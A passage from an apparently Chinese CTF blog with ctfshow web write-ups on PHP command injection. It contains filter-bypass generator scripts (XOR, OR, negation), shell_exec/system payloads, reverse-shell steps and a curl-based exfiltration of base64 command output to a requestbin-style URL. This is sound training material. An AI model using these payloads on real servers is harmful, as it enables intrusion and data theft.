class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];   </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/i&#x27;</span>,<span class="variable">$code</span>))&#123;   <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);   </span><br><span class="line">&#125;   </span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br></pre></td></tr></table></figure><h5 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h5><blockquote><p>这里可以使用异或绕过<br>有两个代码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">256</span>;<span class="variable">$i</span>++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># import requests</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">s1=<span class="string">&quot;&quot;</span></span><br><span class="line">s2=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">t=f.readline()</span><br><span class="line"><span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line"><span class="comment">#print(i)</span></span><br><span class="line">s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">f.close()</span><br><span class="line">output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line"><span class="keyword">return</span>(output)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure><blockquote><p>这是脚本的使用方法<img src="/img/m7.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>使用异或绕过后，我们就能拿到flag<img src="/img/m8.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>这里也可以使用或绕过，脚本使用与异或绕过类似，这里附上脚本，感兴趣的可以自己尝试</p></blockquote><h5 id="或"><a href="#或" class="headerlink" title="或"></a>或</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;or_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">256</span>;<span class="variable">$i</span>++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[0-9a-z]/i&#x27;</span>;<span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">s1=<span class="string">&quot;&quot;</span></span><br><span class="line">s2=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;or_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">t=f.readline()</span><br><span class="line"><span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line"><span class="comment">#print(i)</span></span><br><span class="line">s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">f.close()</span><br><span class="line">output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line"><span class="keyword">return</span>(output)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure><h5 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h5><blockquote><p>这里也可以使用取反绕过<br>代码奉上</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;system&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;(&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;~&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;)&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>使用方法是将system改成你需要的指令，第一个是调动函数，第二个是调动函数的函数参数<br>点击ctrl+s保存后<br>打开本地的php环境，就能看到经过取反后的指令<br>进行拼接后，记得在最后加个分号<br>下面是使用教程</p></blockquote><blockquote><p>首先输入函数名称<img src="/img/m9.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>去本地php环境中查看<img src="/img/m10.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>将函数名称改为函数参数<br><img src="/img/m11.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>再去本地php环境中看<br><img src="/img/m12.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>最后进行拼接，注意在最后面写上；<br><img src="/img/m13.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>拿到 flag ，例题仍为ctfshow私教课web29</p></blockquote><hr><blockquote><h6 id="这里的取反绕过可以直接看控制台，不用这么麻烦"><a href="#这里的取反绕过可以直接看控制台，不用这么麻烦" class="headerlink" title="这里的取反绕过可以直接看控制台，不用这么麻烦"></a>这里的取反绕过可以直接看控制台，不用这么麻烦</h6></blockquote><h4 id="ctfshow私教课web14"><a href="#ctfshow私教课web14" class="headerlink" title="ctfshow私教课web14"></a>ctfshow私教课web14</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>     </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);   </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);   </span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];      </span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$cmd</span>))&#123;   <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);   </span><br><span class="line">&#125;      </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>首先php7中文手册查询shell_exec的作用<br>shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。无回显</p></blockquote><blockquote><p>&#x2F;?cmd&#x3D;cat fla?.php&gt;2.txt<br>再访问2.txt就可以得到结果</p></blockquote><h5 id="使用cp的格式"><a href="#使用cp的格式" class="headerlink" title="使用cp的格式"></a>使用cp的格式</h5><ul><li>使用&gt;<br>例如 &#x2F;?cmd&#x3D;cat &#x2F;flag.php&gt;1.txt<br>这里需要使用指令，使用cat等</li><li>直接cp<br>例如&#x2F;?cmd&#x3D;cp flag.php 1.txt<br>这里只需要知道目标的名字就行了</li></ul><h4 id="ctfshow私教课web15-反弹shell"><a href="#ctfshow私教课web15-反弹shell" class="headerlink" title="ctfshow私教课web15(反弹shell)"></a>ctfshow私教课web15(反弹shell)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>     </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);   </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);   </span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];      </span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$cmd</span>))&#123;   <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);   </span><br><span class="line">&#125;      </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>虽然题目和web14相同，但是没办法使用mv和cp了，我们可以考虑使用反弹shell</p></blockquote><p><img src="/img/m14.jpg" alt="输入图片说明"></p><blockquote><p>先监听，然后再反弹shell</p></blockquote><p><img src="/img/m15.jpg" alt="输入图片说明"></p><blockquote><p>最终如第一张图，输入简单指令拿到flag</p></blockquote><h4 id="ctfshow私教课web16-高级信道"><a href="#ctfshow私教课web16-高级信道" class="headerlink" title="ctfshow私教课web16(高级信道)"></a>ctfshow私教课web16(高级信道)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>      </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);   </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);   </span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];      </span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|dnslog/i&quot;</span>,<span class="variable">$cmd</span>))&#123;   <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);   </span><br><span class="line">&#125;      </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="https-requestrepo-com"><a href="#https-requestrepo-com" class="headerlink" title="https://requestrepo.com/#/"></a><a href="https://requestrepo.com/#/">https://requestrepo.com/#/</a></h4><blockquote><p>首先打开网址，复制url</p></blockquote><p><img src="/img/m16.jpg" alt="输入图片说明"></p><blockquote><p>然后回到题目，开始构造</p></blockquote><p><img src="/img/m17.jpg" alt="输入图片说明"></p><blockquote><p>横线处为复制的url但是前面需要加上 curl http:&#x2F;&#x2F;然后后面进行传参?1&#x3D;<code>ls .|base64</code>，这是我们要执行的命令</p><p>这里的ls .查看的是本目录的东西，需要在ls后面加点，经过base64编码</p></blockquote><blockquote><p>再打开网址，找GET命令<br>这一段经过base编码后的字符串就是我们查询的结果，经过解码后就能看到</p></blockquote><p><img src="/img/m18.jpg" alt="输入图片说明"></p><blockquote><p><img src="/img/m19.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>我们再重复操作，就能拿到flag<img src="/img/m20.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>当然这道题使用反弹shell也可以拿到flag，感兴趣的可以自行尝试</p></blockquote><hr><h5 id="反弹shell的指令可以通过一个网址拿到，就不需要记了"><a href="#反弹shell的指令可以通过一个网址拿到，就不需要记了" class="headerlink" title="反弹shell的指令可以通过一个网址拿到，就不需要记了"></a>反弹shell的指令可以通过一个网址拿到，就不需要记了</h5><p><a href="http://your-shell.com/">http://your-shell.com</a><br>访问后可以看到<img src="/img/m21.jpg" alt="输入图片说明"></p><blockquote><p>复制过去，然后将your ip的地方改成自己的ip,将端口改成自己监听的端口<br>后续操作和普通的反弹shell相同，不再一一赘述</p></blockquote><p><img src="/img/m22.jpg" alt="输入图片说明"></p><hr><p>ctf之路很长，我们要慢慢走。<br>2025.1.14</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>php知识+wp</title>
      <link href="/2025/01/12/php%E7%9F%A5%E8%AF%86+wp/"/>
      <url>/2025/01/12/php%E7%9F%A5%E8%AF%86+wp/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="ctfshow私教课第二节"><a href="#ctfshow私教课第二节" class="headerlink" title="ctfshow私教课第二节"></a>ctfshow私教课第二节</h1><h3 id="认识php"><a href="#认识php" class="headerlink" title="认识php"></a>认识php</h3><p>php是一种开源服务器端脚本语言</p><p>php的基本语法是函数名(函数参数)分号<br>可以有零或者多个参数，如果没有参数就不写<br>phpinfo 显示当前服务器上php的基本信息</p><p>可以自定义函数，例如下面这个就是用php语言写的简单加和</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$a</span>+<span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">add</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>危险函数<br>比较危险的函数，如果参数用户可控，会造成灾难性的后果</p><p>例如：</p><ol><li>system函数<br>执行外部程序，并且显示输出<br>还有很多可以查询php7中文手册</li></ol><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>命令执行一般指目标服务器上的命令执行，也就是远程命令执行，英文缩写为RCE，有远程命令执行和远程代码执行</p><h4 id="php的命令执行函数"><a href="#php的命令执行函数" class="headerlink" title="php的命令执行函数"></a>php的命令执行函数</h4><ul><li>system</li><li>passthru</li><li>exec</li><li>shell_exec</li><li>popen</li><li>pcntl_exec</li><li>执行运算符<br>具体使用参考php7中文手册</li></ul><h4 id="连接符"><a href="#连接符" class="headerlink" title="连接符"></a>连接符</h4><ul><li>&amp;&amp; 前后两个命令是并列执行 短路<br>注意在使用时需要进行url编码<img src="/img/lianjie0.jpg" alt="输入图片说明"></li><li>|| 前后两个命令有一个执行成功就可以</li><li>；独立的两条命令执行</li><li>前两个于c语言中相似</li></ul><h4 id="ctfshow私教课web8"><a href="#ctfshow私教课web8" class="headerlink" title="ctfshow私教课web8"></a>ctfshow私教课web8</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>      </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);      </span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];  </span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);  </span><br><span class="line"><span class="meta">?&gt;</span>   </span><br></pre></td></tr></table></figure><blockquote><p>&#x2F;dev&#x2F;null 2&gt;&amp;1</p></blockquote><p>黑洞函数，可以删除回显导致看不到回显</p><p>我们可以通过以下几种方式进行绕过</p><ul><li>利用||的短路特性<br>cmd&#x3D;tac flag.php||</li><li>将回显复制到文本中<br>cp flag.php 1.txt<br>再访问1.txt就可以看到回显</li><li>将回显移动到我们可以访问的地方<br>mv flag.php 1.txt<br>再访问1.txt就可以看到回显</li><li>还有其他多种方法不再一一赘述(主要是我也不知道）</li></ul><h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><h4 id="替换过滤"><a href="#替换过滤" class="headerlink" title="- 替换过滤"></a>- 替换过滤</h4><p>将关键词换为空，例如替换cat为空<br>我们可以使用双写绕过，ccatat，替换后仍然为cat<br>但是如果是将关键词替换为其他字符，那么双写绕过就没什么作用了</p><h4 id="过滤特定字符串-例如flag-的情况："><a href="#过滤特定字符串-例如flag-的情况：" class="headerlink" title="- 过滤特定字符串(例如flag)的情况："></a>- 过滤特定字符串(例如flag)的情况：</h4><p>例如过滤了flag关键字，我们可以使用通配符进行绕过</p><ol><li>? 代表一个任意字符<br>例如可以输入 cat fla? 来代替cat flag.php</li><li>*表示任意长度字符</li></ol><p>例如可以输入 cat f*来代替 cat flag.php</p><h4 id="ctfshow私教课web9"><a href="#ctfshow私教课web9" class="headerlink" title="ctfshow私教课web9"></a>ctfshow私教课web9</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">`<span class="meta">&lt;?php</span>      </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);   </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);   </span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];         </span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|\&amp;|\;/i&quot;</span>,<span class="variable">$cmd</span>))&#123;   </span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);   </span><br><span class="line">&#125;      </span><br><span class="line"><span class="meta">?&gt;</span>   `</span><br></pre></td></tr></table></figure><ul><li>利用||的短路特性<br>cmd&#x3D;tac fla?.php||</li><li>将回显复制到文本中<br>cp flag.ph? 